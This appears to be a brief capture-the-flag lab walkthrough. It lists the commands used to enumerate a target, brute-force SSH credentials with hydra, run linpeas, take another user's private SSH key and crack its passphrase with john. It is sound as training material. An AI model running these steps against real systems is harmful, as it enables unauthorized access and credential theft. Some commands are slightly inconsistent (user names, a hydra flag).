Found hidden directory /development using dirsearch/gobuster/dirbuster
Found users 'jay' and 'kay' using enum4linux -a <ip>
Found ssh credentials using hydra -l jan -p rockyou.txt ssh://<ip>
Finding possible PE vectors by using linepeas.sh by copying it over to the machine using scp linpeas.sh jan@<ip>:directory to copy to [/dev/shm]
On running linpeas.sh, it shows us that possible private ssh keys can be found in the directory of user kay
User kay also contains a file pass.bak which we cant view unless we're that user
Copy the id_rsa and paste it into a new text file and give it chmod 600 permissions.
On trying to ssh as user kay using ssh -i kay_id_rsa, we are asked for the password
Now we'll use john the ripper to crack the password.
use ssh2john.py [/usr/share/john] : ssh2john.py kay_id_rsa > <.txt file>
Now john <.txt file> --wordlist=rockyou.txt
John cracks the password
ssh as kay into the user and get the password

Room completed.
